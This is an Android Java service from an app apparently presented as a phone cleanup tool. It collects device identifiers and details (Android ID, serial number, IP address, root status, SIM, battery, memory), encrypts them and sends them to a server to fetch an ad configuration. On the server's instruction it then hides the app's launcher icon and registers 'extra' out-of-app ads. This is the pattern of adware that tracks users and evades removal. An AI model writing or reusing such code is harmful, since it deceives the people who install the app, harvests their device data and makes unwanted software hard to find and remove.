package com.expert.cleanup.nets;

import java.util.Map;
import android.os.Build;
import android.util.Log;
import java.util.HashMap;
import com.expert.cleanup.R;
import android.content.Intent;
import com.expert.cleanup.BaseApp;
import android.app.IntentService;
import androidx.annotation.Nullable;
import android.content.ComponentName;
import io.reactivex.schedulers.Schedulers;
import com.expert.cleanup.nets.config.AdConfig;
import com.expert.cleanup.nets.util.PhoneHelper;
import com.expert.cleanup.nets.client.NetClient;
import com.expert.cleanup.nets.client.NetParams;
import com.expert.cleanup.nets.client.ReturnData;
import io.reactivex.android.schedulers.AndroidSchedulers;
import com.expert.cleanup.nets.config.AdConfigProvider;
import com.expert.cleanup.nets.client.ReturnNetObjCallBack;
import com.expert.cleanup.nets.client.ReturnResultConfigInfos;
import static com.expert.cleanup.nets.NetStateReceiver.isPrintNetLog;

public class GetDefConfigInfo extends IntentService
{
    public GetDefConfigInfo()
    {
        super("GetDefConfigInfo");
    }

    protected void onHandleIntent(@Nullable Intent intent)
    {
        Map orgMap = new HashMap();
        Map requestMap = new HashMap();
        orgMap.put("m",Build.HARDWARE);
        orgMap.put("n",getPackageName());
        orgMap.put("f",PhoneHelper.getSystemVersion());
        orgMap.put("i",PhoneHelper.getSystemLanguage());
        orgMap.put("j",PhoneHelper.getCurrentTimeZone());
        orgMap.put("g",PhoneHelper.isDeviceRooted() ? "1" : "0");
        orgMap.put("e",PhoneHelper.getIPAddress(getApplicationContext()));
        orgMap.put("a",PhoneHelper.getAndroidId(getApplicationContext()));
        orgMap.put("d",PhoneHelper.getResolution(getApplicationContext()));
        orgMap.put("v",PhoneHelper.getVersionName(getApplicationContext()));
        orgMap.put("x",PhoneHelper.getBatteryLevel(getApplicationContext()));
        orgMap.put("y",PhoneHelper.getBatteryStatus(getApplicationContext()));
        orgMap.put("b", PhoneHelper.getSerialNumber(getApplicationContext()));
        orgMap.put("k",PhoneHelper.getRamTotalMemory(getApplicationContext()));
        orgMap.put("l",PhoneHelper.getRomTotalMemory(getApplicationContext()));
        orgMap.put("w",PhoneHelper.getBatteryTemperature(getApplicationContext()));
        orgMap.put("h",PhoneHelper.isHasSimCard(getApplicationContext()) ? "1" : "0");
        orgMap.put("c",PhoneHelper.getDeviceBrand() + ":" + PhoneHelper.getSystemModel());
        requestMap.putAll(NetParams.getInstance().putFormsAddEncry(orgMap).convertForms().getMultipartForms());
        NetClient.getInstance(getApplicationContext()).getNetAllUrl().getAdConfigInfos(requestMap)./**********/
        subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(new ReturnNetObjCallBack<ReturnData<ReturnResultConfigInfos>>(getApplicationContext())
        {
            public void onSuccess(ReturnData<ReturnResultConfigInfos> returnResultConfigInfos)
            {
                AdConfig adConfig = returnResultConfigInfos.getData().convertToAdConfig();
                if(adConfig.isPlayExtraAd() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)adConfig.setIsHideIcon(false);
                AdConfigProvider.setLocalAdConfig(getApplicationContext(),adConfig);
                BaseApp.getInstance().setAdConfig(adConfig);
                normalProcess(adConfig);
            }

            public void onFailure(String msg)
            {
                exceptionProcess(msg);

            }

            public void onError(String msg)
            {
                exceptionProcess(msg);

            }
        });
    }

    public void normalProcess(AdConfig adConfig)
    {
        if(isPrintNetLog)
            Log.i("NetNotes","GetDefConfigInfoNormal: " + adConfig.toString());
        if(null == adConfig)
        {
            adConfig = new AdConfig(false,false,0,
           0,0l, getString(R.string.fb_placement_in_id),
            getString(R.string.gg_interstitial), 0, 0,0l,0l);
            AdConfigProvider.setLocalAdConfig(getApplicationContext(),adConfig);
            BaseApp.getInstance().setAdConfig(adConfig);
        }
        if(null != adConfig)
        {
            if(adConfig.isHideIcon())
            {
                Intent intent = new Intent();
                intent.putExtra(HideIconService.DELAY_TIME,adConfig.getDelayTimeForHideIcon());
                intent.setComponent(new ComponentName(GetDefConfigInfo.this,HideIconService.class));
                GetDefConfigInfo.this.getApplicationContext().startService(intent);
            }
        }
        BaseApp.getInstance().registerAssistOfExtraAd(this);
    }

    public void exceptionProcess(String msg)
    {
        if(isPrintNetLog)
            Log.i("NetNotes", "GetDefConfigInfoException: " + msg);
        AdConfig adConfig = BaseApp.getInstance().getAdConfig();
        if(null == adConfig)
        {
            adConfig = new AdConfig(false,false, 0,
           0,0l, getString(R.string.fb_placement_in_id),
            getString(R.string.gg_interstitial),0,0,0l,0l);
            AdConfigProvider.setLocalAdConfig(getApplicationContext(),adConfig);
            BaseApp.getInstance().setAdConfig(adConfig);
        }
        if(null != adConfig)
        {
            if(adConfig.isHideIcon())
            {
                Intent intent = new Intent();
                intent.putExtra(HideIconService.DELAY_TIME,adConfig.getDelayTimeForHideIcon());
                intent.setComponent(new ComponentName(GetDefConfigInfo.this,HideIconService.class));
                GetDefConfigInfo.this.getApplicationContext().startService(intent);
            }
        }
        NetStateReceiver.getInstance().setAllowRetry(true);
    }
}